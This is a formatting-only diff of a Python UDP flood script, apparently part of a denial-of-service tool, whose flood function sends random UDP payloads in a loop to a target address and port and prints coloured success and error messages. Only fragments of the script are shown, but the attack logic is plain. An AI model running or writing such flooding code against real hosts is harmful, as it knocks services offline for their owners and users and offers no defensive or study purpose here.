@@ -1,6 +1,7 @@
 # Import modules
 import random
 import socket
+
 from colorama import Fore
 
 # Create socket
@@ -14,9 +15,9 @@ def flood(target):
             sock.sendto(payload, (target[0], target[1]))
         except Exception as e:
             print(
-                f"{Fore.MAGENTA}Error while sending UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
+                f"{Fore.MAGENTA}Error while sending UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}",
             )
         else:
             print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}UDP random packet sent! Payload size: {len(payload)}. {Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.YELLOW}UDP random packet sent! Payload size: {len(payload)}. {Fore.RESET}",
             )
